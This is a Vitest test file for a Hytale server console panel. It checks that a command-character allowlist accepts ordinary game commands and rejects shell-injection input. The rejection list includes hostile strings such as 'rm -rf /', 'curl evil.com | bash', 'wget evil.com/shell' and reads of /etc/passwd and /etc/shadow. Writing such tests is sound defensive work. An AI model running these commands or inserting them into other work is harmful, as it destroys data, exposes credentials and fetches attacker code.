import { describe, it, expect } from 'vitest';
import { MAX_COMMAND_LENGTH, COMMAND_CHAR_ALLOWLIST } from '@hytale-panel/shared';

/**
 * Console Command Allowlist Tests
 * Tests that valid game commands pass validation,
 * dangerous/invalid commands are rejected,
 * and the allowlist regex is correctly defined.
 */

function sanitizeCommand(command: string): string {
  const trimmed = command.trim();
  if (trimmed.length === 0) throw new Error('Command cannot be empty');
  if (trimmed.length > MAX_COMMAND_LENGTH) throw new Error(`Command exceeds maximum length of ${MAX_COMMAND_LENGTH}`);
  if (!COMMAND_CHAR_ALLOWLIST.test(trimmed)) throw new Error('Command contains disallowed characters');
  return trimmed;
}

describe('Console Command Allowlist — Valid Game Commands', () => {
  const validCommands = [
    'save',
    'stop',
    'whitelist add Player1',
    'whitelist remove TestUser_123',
    'whitelist list',
    'ban Player2',
    'ban Player2 Griefing',
    'unban Player2',
    'kick Player3',
    'kick Player3 AFK too long',
    'say Hello everyone',
    'tp Player1 0 64 0',
    'tp Player1 Player2',
    'gamemode creative Player1',
    'gamemode survival Player1',
    'time set day',
    'time set 6000',
    'weather clear',
    'weather rain',
    'difficulty normal',
    'difficulty hard',
    'seed',
    'list',
    'help',
    'op Player1',
    'deop Player1',
    'give Player1 diamond_sword 1',
    'effect give Player1 speed 60 2',
    'gamerule keepInventory true',
    'setblock 0 64 0 stone',
    'fill 0 60 0 10 64 10 air',
  ];

  for (const cmd of validCommands) {
    it(`should accept: "${cmd}"`, () => {
      expect(sanitizeCommand(cmd)).toBe(cmd);
    });
  }
});

describe('Console Command Allowlist — Dangerous Commands Rejected', () => {
  const dangerousCommands = [
    // Shell injection
    { cmd: 'save; rm -rf /', reason: 'semicolon command chain' },
    { cmd: 'save && curl evil.com | bash', reason: 'AND chain with pipe' },
    { cmd: 'save || wget evil.com/shell', reason: 'OR chain' },
    { cmd: '$(cat /etc/passwd)', reason: 'command substitution' },
    { cmd: '`whoami`', reason: 'backtick substitution' },
    { cmd: 'save > /dev/sda', reason: 'output redirect to device' },
    { cmd: 'save < /etc/shadow', reason: 'input redirect' },
    { cmd: 'save >> /etc/crontab', reason: 'append to crontab' },
    // Escape sequences
    { cmd: 'save\x00evil', reason: 'null byte injection' },
    { cmd: 'save\nevil', reason: 'newline injection' },
    { cmd: 'save\revil', reason: 'carriage return injection' },
    { cmd: 'save\tevil', reason: 'tab injection' },
    // Quote injection
    { cmd: "save' --", reason: 'single quote injection' },
    { cmd: 'save" --', reason: 'double quote injection' },
    // Special characters
    { cmd: 'save!history', reason: 'history expansion' },
    { cmd: 'save#comment', reason: 'comment character' },
    { cmd: 'rm *', reason: 'glob wildcard' },
    { cmd: 'cat /etc/passw?', reason: 'glob single char' },
    { cmd: 'cat {a,b}', reason: 'brace expansion' },
  ];

  for (const { cmd, reason } of dangerousCommands) {
    it(`should reject ${reason}: "${cmd.replace(/[\n\r\t\x00]/g, '\\n')}"`, () => {
      expect(() => sanitizeCommand(cmd)).toThrow('disallowed characters');
    });
  }
});

describe('Console Command Allowlist — Allowed Character Set', () => {
  it('should allow lowercase letters', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('abcdefghijklmnopqrstuvwxyz')).toBe(true);
  });

  it('should allow uppercase letters', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('ABCDEFGHIJKLMNOPQRSTUVWXYZ')).toBe(true);
  });

  it('should allow digits', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('0123456789')).toBe(true);
  });

  it('should allow spaces', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('hello world')).toBe(true);
  });

  it('should allow underscores', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('player_name')).toBe(true);
  });

  it('should allow hyphens', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('pre-update')).toBe(true);
  });

  it('should allow dots', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('config.json')).toBe(true);
  });

  it('should allow @ symbol', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('player@server')).toBe(true);
  });

  it('should allow colons', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('minecraft:stone')).toBe(true);
  });

  it('should allow forward slashes', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('path/to/file')).toBe(true);
  });

  it('should NOT allow backslashes', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('path\\to\\file')).toBe(false);
  });

  it('should NOT allow semicolons', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('cmd;evil')).toBe(false);
  });

  it('should NOT allow pipes', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('cmd|evil')).toBe(false);
  });

  it('should NOT allow angle brackets', () => {
    expect(COMMAND_CHAR_ALLOWLIST.test('cmd>file')).toBe(false);
    expect(COMMAND_CHAR_ALLOWLIST.test('cmd<file')).toBe(false);
  });
});

describe('Console Command Allowlist — Edge Cases', () => {
  it('should accept single character command', () => {
    expect(sanitizeCommand('a')).toBe('a');
  });

  it('should accept command at max length', () => {
    const cmd = 'a'.repeat(MAX_COMMAND_LENGTH);
    expect(sanitizeCommand(cmd)).toBe(cmd);
  });

  it('should reject empty command', () => {
    expect(() => sanitizeCommand('')).toThrow('cannot be empty');
  });

  it('should reject whitespace-only command', () => {
    expect(() => sanitizeCommand('   ')).toThrow('cannot be empty');
  });

  it('should trim leading/trailing whitespace', () => {
    expect(sanitizeCommand('  save  ')).toBe('save');
  });
});